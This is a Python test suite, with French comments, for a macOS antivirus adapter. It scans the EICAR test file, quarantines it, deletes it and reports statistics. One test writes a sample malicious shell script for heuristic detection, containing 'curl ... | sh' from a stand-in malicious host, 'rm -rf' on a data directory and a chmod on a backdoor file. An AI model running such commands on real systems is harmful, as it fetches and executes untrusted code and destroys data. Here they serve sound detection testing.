"""
HOPPER - Tests Antivirus
Tests avec fichier EICAR et simulation de menaces
"""

import asyncio
import sys
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from connectors.antivirus.adapters.macos_adapter import MacOSAntivirusAdapter


async def test_eicar():
    """Test avec le fichier EICAR (test antivirus standard)"""
    print("\n" + "="*70)
    print("🧪 TEST ANTIVIRUS HOPPER - Fichier EICAR")
    print("="*70 + "\n")
    
    # Créer adapter
    print("📦 Initialisation de l'adapter macOS...")
    adapter = MacOSAntivirusAdapter()
    print(f"✅ Adapter initialisé (ClamAV: {adapter.clamav_installed})\n")
    
    # Créer fichier EICAR test
    test_file = Path("/tmp/eicar_test.txt")
    eicar_string = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    
    print("📝 Création du fichier EICAR test...")
    with open(test_file, "w") as f:
        f.write(eicar_string)
    print(f"✅ Fichier créé: {test_file}\n")
    
    # Test 1: Scan du fichier
    print("🔍 TEST 1: Scan du fichier EICAR")
    print("-" * 70)
    scan_result = await adapter.scan_file(str(test_file))
    
    print(f"  Fichier sain: {scan_result.get('clean')}")
    print(f"  Menaces trouvées: {len(scan_result.get('threats', []))}")
    print(f"  Temps de scan: {scan_result.get('scan_time', 0):.2f}s")
    print(f"  Méthodes utilisées: {scan_result.get('methods_used')}")
    
    if scan_result.get('threats'):
        print("\n  ⚠️ MENACES DÉTECTÉES:")
        for threat in scan_result.get('threats', []):
            print(f"    - {threat.get('name')} ({threat.get('type')})")
            print(f"      Niveau: {threat.get('level')}")
            print(f"      Confiance: {threat.get('confidence', 0)*100:.0f}%")
            print(f"      Méthode: {threat.get('method')}")
    print()
    
    # Test 2: Mise en quarantaine
    print("🔒 TEST 2: Mise en quarantaine")
    print("-" * 70)
    quarantine_result = await adapter.quarantine_file(
        str(test_file),
        reason="EICAR test file detected"
    )
    
    if quarantine_result.get('success'):
        print(f"  ✅ Fichier mis en quarantaine")
        print(f"  Original: {quarantine_result.get('original_path')}")
        print(f"  Quarantaine: {quarantine_result.get('quarantine_path')}")
        print(f"  ID: {quarantine_result.get('quarantine_id')}")
        
        quarantine_id = quarantine_result.get('quarantine_id')
        quarantine_path = quarantine_result.get('quarantine_path')
    else:
        print(f"  ❌ Échec: {quarantine_result.get('error')}")
        quarantine_id = None
        quarantine_path = None
    print()
    
    # Test 3: Liste quarantaine
    print("📋 TEST 3: Liste des fichiers en quarantaine")
    print("-" * 70)
    quarantine_list = await adapter.list_quarantine()
    print(f"  Fichiers en quarantaine: {len(quarantine_list)}")
    for item in quarantine_list:
        print(f"    - {item.get('original_path')}")
        print(f"      ID: {item.get('quarantine_id')}")
        print(f"      Date: {item.get('quarantine_date')}")
    print()
    
    # Test 4: Suppression (SIMULATION - utilisateur doit confirmer)
    if quarantine_path:
        print("🗑️  TEST 4: Suppression du fichier malveillant")
        print("-" * 70)
        print("  ⚠️  ATTENTION: Suppression irréversible !")
        print(f"  Fichier: {quarantine_path}")
        print("  [En production, l'utilisateur devrait confirmer via ConfirmationEngine]")
        
        # Simulation confirmation utilisateur
        user_confirmed = True
        
        if user_confirmed:
            remove_result = await adapter.remove_threat(
                quarantine_path,
                secure_delete=True
            )
            
            if remove_result.get('success'):
                print(f"  ✅ Fichier supprimé avec succès")
                print(f"  Méthode: {remove_result.get('method')}")
                print(f"  Passes: {remove_result.get('passes')}")
            else:
                print(f"  ❌ Échec: {remove_result.get('error')}")
        else:
            print("  ❌ Suppression annulée par l'utilisateur")
    print()
    
    # Test 5: Statistiques
    print("📊 TEST 5: Statistiques antivirus")
    print("-" * 70)
    stats = await adapter.get_threat_statistics()
    print(f"  Total menaces détectées: {stats.get('total_threats_detected')}")
    print(f"  Fichiers en quarantaine: {stats.get('threats_quarantined')}")
    print(f"  Menaces supprimées: {stats.get('threats_removed')}")
    print(f"  Total scans effectués: {stats.get('total_scans')}")
    print()
    
    # Test 6: État protection
    print("🛡️  TEST 6: État de la protection")
    print("-" * 70)
    status = await adapter.get_protection_status()
    print(f"  Protection activée: {status.get('enabled')}")
    print(f"  ClamAV installé: {status.get('clamav_installed')}")
    print(f"  Surveillance temps réel: {status.get('realtime_protection')}")
    print(f"  Dernier scan: {status.get('last_scan_date')}")
    print()
    
    print("="*70)
    print("✅ TESTS TERMINÉS")
    print("="*70)


async def test_suspicious_file():
    """Test avec un fichier suspect (pas virus mais comportement dangereux)"""
    print("\n" + "="*70)
    print("🧪 TEST ANTIVIRUS - Fichier Suspect (Heuristique)")
    print("="*70 + "\n")
    
    adapter = MacOSAntivirusAdapter()
    
    # Créer fichier suspect
    test_file = Path("/tmp/suspicious_script.sh")
    suspicious_content = """#!/bin/bash
# Script suspect
curl http://malicious-site.com/payload.sh | sh
rm -rf /important-data
chmod +x /tmp/backdoor
"""
    
    print("📝 Création d'un script suspect...")
    with open(test_file, "w") as f:
        f.write(suspicious_content)
    print(f"✅ Fichier créé: {test_file}\n")
    
    # Scan
    print("🔍 Scan heuristique du fichier suspect")
    print("-" * 70)
    scan_result = await adapter.scan_file(str(test_file))
    
    print(f"  Fichier sain: {scan_result.get('clean')}")
    print(f"  Menaces trouvées: {len(scan_result.get('threats', []))}")
    
    if scan_result.get('threats'):
        print("\n  ⚠️ COMPORTEMENTS SUSPECTS DÉTECTÉS:")
        for threat in scan_result.get('threats', []):
            print(f"    - {threat.get('name')}")
            print(f"      Type: {threat.get('type')}")
            print(f"      Description: {threat.get('description')}")
            print(f"      Action recommandée: {threat.get('action_recommended')}")
    print()
    
    # Cleanup
    if test_file.exists():
        test_file.unlink()
        print("🧹 Fichier de test supprimé\n")


async def test_quick_scan():
    """Test du scan rapide"""
    print("\n" + "="*70)
    print("🧪 TEST ANTIVIRUS - Scan Rapide")
    print("="*70 + "\n")
    
    adapter = MacOSAntivirusAdapter()
    
    print("⚡ Lancement du scan rapide...")
    print("-" * 70)
    
    result = await adapter.quick_scan()
    
    print(f"  Type: {result.get('scan_type')}")
    print(f"  Fichiers scannés: {result.get('files_scanned')}")
    print(f"  Menaces trouvées: {result.get('threats_found')}")
    print(f"  Temps: {result.get('scan_time', 0):.2f}s")
    
    if result.get('infected_files'):
        print("\n  ⚠️ FICHIERS INFECTÉS:")
        for infected in result.get('infected_files', []):
            print(f"    - {infected.get('path')}")
    print()


async def main():
    """Lance tous les tests"""
    print("\n")
    print("╔" + "="*68 + "╗")
    print("║" + " "*68 + "║")
    print("║" + "     🛡️  HOPPER ANTIVIRUS - SUITE DE TESTS COMPLÈTE  🛡️     ".center(68) + "║")
    print("║" + " "*68 + "║")
    print("╚" + "="*68 + "╝")
    
    try:
        # Test 1: EICAR
        await test_eicar()
        
        # Test 2: Fichier suspect
        await test_suspicious_file()
        
        # Test 3: Scan rapide
        await test_quick_scan()
        
        print("\n" + "="*70)
        print("🎉 TOUS LES TESTS RÉUSSIS !")
        print("="*70 + "\n")
        
    except Exception as e:
        print(f"\n❌ ERREUR: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
